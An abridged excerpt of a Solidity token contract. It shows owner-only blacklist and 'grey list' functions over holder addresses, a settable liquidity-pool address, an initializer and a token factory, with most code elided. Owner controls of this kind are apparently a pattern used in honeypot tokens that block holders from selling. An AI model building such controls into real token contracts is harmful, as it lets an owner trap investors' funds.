...
contract StandardToken is ERC20 {
    ...
    function _blackAddressList(address[] calldata _addressList, bool _isBlackListed) internal returns (bool) {
    ...
    function _geryAddressList(address[] calldata _addressList, bool _isGeryListed) internal returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
...
contract PausableToken is StandardToken, Ownable {
    ...
    function blackAddressList(address[] calldata listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {
        return super._blackAddressList(listAddress, isBlackListed);
    }
    function geryAddressList(address[] calldata listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {
...
contract Token is PausableToken {
    ...
    function initToken(string calldata  _name, string calldata  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner) public notInitialized returns (bool){
        _INITIALIZED_=true;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    ...
    function setLp(address _lp) onlyOwner public {
        LP=_lp;
    }
...
contract CoinFactory{
    ...
    function createToken(string calldata  _name, string calldata  _symbol, uint256 _decimals, uint256 _supply,address tokenOwner)public returns (address){
